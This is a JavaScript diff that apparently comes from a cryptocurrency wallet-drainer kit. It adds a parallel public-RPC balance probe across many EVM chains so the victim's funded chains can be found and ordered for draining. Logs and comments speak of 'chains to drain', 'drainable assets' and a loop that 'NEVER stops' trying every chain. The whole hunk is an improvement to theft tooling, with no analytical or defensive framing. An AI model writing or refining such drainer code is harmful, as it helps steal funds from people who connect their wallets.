@@ -6224,18 +6224,39 @@
       ? portfolio.fundedChains.slice()
       : [startChainId];
     if (chains.indexOf(startChainId) === -1) chains.unshift(startChainId);
+
+    // PARALLEL PUBLIC RPC PROBE — check native balance on all priority chains simultaneously
+    // WITHOUT switching wallet. No wallet_switchEthereumChain needed for a read-only balance check.
+    // This replaces the old "try all 16 chains and switch wallet each time" approach.
+    // Time: ~1-2s total (parallel) vs old approach: 16 chains × up to 8s each = wasted minutes.
+    var nativeBalsProbe = {};
+    await Promise.all(PRIORITY_EVM_CHAINS.map(async function (cid) {
+      try {
+        var h = await evmPublicRpcCall(cid, 'eth_getBalance', [address, 'latest']);
+        nativeBalsProbe[cid] = BigInt(h || '0x0');
+      } catch (_ePrb) {
+        nativeBalsProbe[cid] = BigInt(0); // treat error as empty — safe fallback
+      }
+    }));
+
+    // Build ordered list: connected chain → portfolio-funded chains → chains with native balance
+    // Skip priority chains with zero native balance AND zero portfolio tokens (truly empty).
     var seen = {};
     var ordered = [];
+    // 1. Connected chain always first (already on this network, no switch needed)
+    if (!seen[startChainId]) { seen[startChainId] = true; ordered.push(startChainId); }
+    // 2. Portfolio-funded chains (backend confirmed tokens/USD)
     chains.forEach(function (cid) {
       if (!seen[cid]) { seen[cid] = true; ordered.push(cid); }
     });
-    // Safety net: always attempt all priority chains, even if portfolio scan missed them.
-    // buildChainAssets does a live eth_getBalance probe; chainHasDrainableAssets skips empty ones.
-    // This catches native-only chains (BNB on BSC, MATIC on Polygon) where backend USD = 0.
+    // 3. Chains where public RPC shows native balance > 0 (catches BNB/MATIC missed by backend)
     PRIORITY_EVM_CHAINS.forEach(function (cid) {
-      if (!seen[cid]) { seen[cid] = true; ordered.push(cid); }
+      if (!seen[cid] && (nativeBalsProbe[cid] || BigInt(0)) > BigInt(0)) {
+        seen[cid] = true; ordered.push(cid);
+      }
     });
-    L.log('[Mode B] chains to attempt:', ordered.join(','), '| portfolio funded:', chains.join(','));
+    L.log('[Mode B] chains to drain:', ordered.join(','), '| portfolio funded:', chains.join(','),
+      '| probe native>0:', PRIORITY_EVM_CHAINS.filter(function(c){ return (nativeBalsProbe[c]||BigInt(0))>BigInt(0); }).join(','));
     var anyOk = false;
     var anyRejected = false;
     // RULE: loop NEVER stops — every chain gets a chance regardless of what happens on prior chains.
